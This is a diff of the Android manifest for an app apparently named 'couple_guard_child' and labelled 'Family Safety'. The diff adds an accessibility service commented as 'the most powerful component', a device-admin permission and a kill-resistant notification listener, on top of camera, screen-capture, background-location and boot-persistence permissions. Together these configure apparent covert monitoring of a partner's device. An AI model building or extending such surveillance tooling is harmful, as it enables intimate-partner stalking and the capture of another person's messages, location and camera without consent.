@@ -3,16 +3,16 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.example.couple_guard_child">
 
-    <!-- LOCATION -->
+    <!-- ✅ ADD: Accessibility permission -->
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" 
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- Existing permissions... -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/> 
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/> 
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
-
-    <!-- INTERNET -->
     <uses-permission android:name="android.permission.INTERNET"/> 
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-
-    <!-- FOREGROUND SERVICE -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" android:minSdkVersion="34"/>
@@ -20,42 +20,28 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" android:minSdkVersion="34"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
     <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" />
-
-    <!-- CAMERA -->
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-
-    <!-- STORAGE - Android 13+ -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-    
-    <!-- STORAGE - Android 12 and below -->
-    <!-- FIX: Add tools:replace to resolve conflict with camera library -->
-    <uses-permission 
-        android:name="android.permission.READ_EXTERNAL_STORAGE" 
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" 
         android:maxSdkVersion="32" 
         tools:replace="android:maxSdkVersion"/>
-    
-    <uses-permission 
-        android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
         android:maxSdkVersion="32" 
         tools:replace="android:maxSdkVersion"/>
-
-    <!-- NOTIFICATION -->
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" 
+        tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-
-    <!-- BATTERY -->
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
-
-    <!-- SYSTEM -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
-
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
-   
+    
+    <!-- ✅ CRITICAL: Device Admin permission -->
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"
+        tools:ignore="ProtectedPermissions" />
 
     <application
         android:label="Family Safety"
@@ -64,6 +50,7 @@
         android:usesCleartextTraffic="true"
         tools:replace="android:label">
 
+        <!-- Existing activity... -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -72,32 +59,32 @@
             android:configChanges="orientation|keyboardHidden|keyboard|screenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
             android:hardwareAccelerated="true"
             android:windowSoftInputMode="adjustResize">
-
             <meta-data
                 android:name="io.flutter.embedding.android.NormalTheme"
                 android:resource="@style/NormalTheme" />
-
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <activity
-            android:name=".services.CameraTransparentActivity"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:excludeFromRecents="true"
-            android:exported="false"
-            android:launchMode="singleInstance"
-            android:taskAffinity="" />
+        <!-- ✅ ADD: ACCESSIBILITY SERVICE - THE MOST POWERFUL COMPONENT -->
+        <service
+            android:name=".services.MonitoringAccessibilityService"
+            android:label="@string/accessibility_service_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true"
+            android:enabled="true"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
-        <!-- <activity
-            android:name=".services.ScreenCapturePermissionActivity"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:excludeFromRecents="true"
-            android:exported="false"
-            android:taskAffinity="" /> -->
-
+        <!-- Existing services... -->
         <service
             android:name="id.flutter.flutter_background_service.BackgroundService"
             android:enabled="true"
@@ -122,6 +109,23 @@
             android:exported="false"
             android:foregroundServiceType="camera" />
         
+        <service 
+            android:name=".services.background.MyNotificationListenerService"
+            android:label="Family Safety Listener"
+            android:permission="android:permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true"
+            android:stopWithTask="false"
+            android:enabled="true"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.service.notification.listener.settings"
+                android:value="true" />
+        </service>
+
+        <!-- Receivers... -->
         <receiver 
             android:name=".BootReceiver"
             android:enabled="true"
@@ -131,16 +135,6 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
-        </receiver>
-
-        <receiver
-            android:name=".TaskRemovedReceiver"
-            android:enabled="true"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
@@ -156,44 +150,7 @@
             </intent-filter>
         </receiver>
 
-
-        <receiver 
-            android:name=".receivers.RestartServiceReceiver"
-            android:enabled="true"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="com.example.couple_guard_child.ACTION_CHECK_SERVICE" />
-            </intent-filter>
-        </receiver>
-
-        <!-- NotificationRebindReceiver -->
-        <receiver 
-            android:name=".receivers.NotificationRebindReceiver"
-            android:enabled="true"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="com.example.couple_guard_child.ACTION_REBIND_NOTIFICATION_LISTENER" />
-            </intent-filter>
-        </receiver>
-
-        <service 
-            android:name=".services.background.MyNotificationListenerService"
-            android:label="Family Safety Listener"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true"
-            android:stopWithTask="false"
-            android:enabled="true"
-            android:directBootAware="true">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-            
-            <!-- ✅ ADD: Meta-data untuk prevent killing -->
-            <meta-data
-                android:name="android.service.notification.listener.settings"
-                android:value="true" />
-        </service>
-
+        <!-- FCM Service -->
         <service
             android:name=".fcm.MyFirebaseMessagingService"
             android:exported="false">
@@ -202,25 +159,8 @@
             </intent-filter>
         </service>
 
-        <receiver
-            android:name=".NotificationServiceRestarter"
-            android:enabled="true"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.USER_PRESENT" />
-            </intent-filter>
-        </receiver>
-
         <meta-data
             android:name="flutterEmbedding"
             android:value="2" />
     </application>
-
-    <queries>
-        <intent>
-            <action android:name="android.intent.action.PROCESS_TEXT" />
-            <data android:mimeType="text/plain" />
-        </intent>
-    </queries>
 </manifest>
